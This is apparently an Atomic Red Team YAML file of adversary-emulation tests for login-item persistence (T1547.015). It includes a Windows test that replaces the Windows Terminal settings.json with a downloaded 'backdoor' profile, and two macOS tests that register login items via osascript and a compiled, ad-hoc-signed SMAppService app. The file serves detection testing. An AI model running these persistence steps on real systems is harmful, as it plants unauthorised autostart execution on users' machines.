attack_technique: T1547.015
display_name: "Boot or Logon Autostart Execution: Login Items"
atomic_tests:
- name: Persistence by modifying Windows Terminal profile
  auto_generated_guid: ec5d76ef-82fe-48da-b931-bdb25a62bc65
  description: Modify Windows Terminal settings.json file to gain persistence. [Twitter Post](https://twitter.com/nas_bench/status/1550836225652686848)
  supported_platforms:
  - windows
  input_arguments:
    calculator:
      description: Test program used to imitate a maliciously called program.
      type: string
      default: calculator.exe
    settings_json_def:
      description: Default file for Windows Terminal to replace the default profile with a backdoor to call another program.
      type: path
      default: ~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json
    settings_json_tmp:
      description: Temp file for Windows Terminal.
      type: path
      default: ~\AppData\Local\Temp\settings.json
    wt_exe:
      description: Windows Terminal executable.
      type: path
      default: ~\AppData\Local\Microsoft\WindowsApps\Microsoft.WindowsTerminal_8wekyb3d8bbwe\wt.exe
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Windows Terminal must be installed
    prereq_command: |
      if (Test-Path #{wt_exe}) {exit 0} else {exit 1}
    get_prereq_command: |
      $(rm ~\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\LocalState\StoreEdgeFD\installed.db -ErrorAction Ignore; Write-Output ""; $?) -and $(winget install --id=Microsoft.WindowsTerminal)
  executor:
    command: |
      mv #{settings_json_def} #{settings_json_tmp}
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true" -OutFile "#{settings_json_def}" -UseBasicParsing
      wt.exe
    cleanup_command: |
      mv -Force #{settings_json_tmp} #{settings_json_def}
      taskkill /F /IM "#{calculator}" > $null
    name: powershell
- name: Add macOS LoginItem using Applescript
  auto_generated_guid: 716e756a-607b-41f3-8204-b214baf37c1d
  description: |
    Runs osascript on a file to create new LoginItem for current user.
    NOTE: Will popup dialog prompting user to Allow or Deny Terminal.app to control "System Events"
    Therefore, it can't be automated until the TCC is granted.
    The login item launches Safari.app when user logs in, but there is a cleanup script to remove it as well.
    In addition to the `osascript` Process Events, file modification events to
    `/Users/*/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm` should be seen.
  supported_platforms:
  - macos
  input_arguments:
    scriptfile:
      description: path to Applescript source to add Safari LoginItem.
      type: string
      default: PathToAtomicsFolder/T1547.015/src/add_login_item.osa
    cleanup_script:
      description: path to Applescript source to delete Safari LoginItem.
      type: string
      default: PathToAtomicsFolder/T1547.015/src/remove_login_item.osa
  executor:
    command: |
      osascript #{scriptfile}
    cleanup_command: |
      osascript #{cleanup_script}
    name: bash
- name: Register the current app as a macOS login item with SMAppService
  auto_generated_guid: 883890b5-10e9-4ad4-8738-f0030992689f
  description: |
    Builds and registers a signed application bundle as a login item through the current SMAppService API. On a default macOS 13 or later installation, registration creates background-task-management state and may require approval in System Settings before the login item is enabled. After approval, the app creates /tmp/T1547.015-smappservice-ran the next time it is launched at login.
  supported_platforms:
  - macos
  input_arguments:
    app_path:
      description: Application bundle registered as a login item
      type: path
      default: $HOME/Applications/T1547.015.app
    source_file:
      description: SMAppService application source
      type: path
      default: PathToAtomicsFolder/T1547.015/src/smappservice_login_item.m
    info_plist:
      description: Application bundle Info.plist
      type: path
      default: PathToAtomicsFolder/T1547.015/src/smappservice_Info.plist
  dependency_executor_name: sh
  dependencies:
  - description: macOS 13 or later is required for SMAppService
    prereq_command: |
      test "$(sw_vers -productVersion | cut -d. -f1)" -ge 13
    get_prereq_command: |
      echo "SMAppService requires macOS 13 or later."
  - description: The source and Info.plist files must exist
    prereq_command: |
      test -f "#{source_file}" && test -f "#{info_plist}"
    get_prereq_command: |
      echo "Re-download the Atomic Red Team atomics to restore the SMAppService source files."
  - description: The signed SMAppService application bundle must exist
    prereq_command: |
      test -x "#{app_path}/Contents/MacOS/T1547.015-smappservice"
      codesign --verify --strict "#{app_path}"
    get_prereq_command: |
      mkdir -p "#{app_path}/Contents/MacOS"
      cp "#{info_plist}" "#{app_path}/Contents/Info.plist"
      clang -fobjc-arc -mmacosx-version-min=13.0 -framework Foundation -framework ServiceManagement "#{source_file}" -o "#{app_path}/Contents/MacOS/T1547.015-smappservice"
      codesign --force --sign - --timestamp=none "#{app_path}"
  executor:
    command: |
      "#{app_path}/Contents/MacOS/T1547.015-smappservice" register
      "#{app_path}/Contents/MacOS/T1547.015-smappservice" status
    cleanup_command: |
      "#{app_path}/Contents/MacOS/T1547.015-smappservice" unregister || true
      rm -rf "#{app_path}"
      rm -f /tmp/T1547.015-smappservice-ran
    name: sh
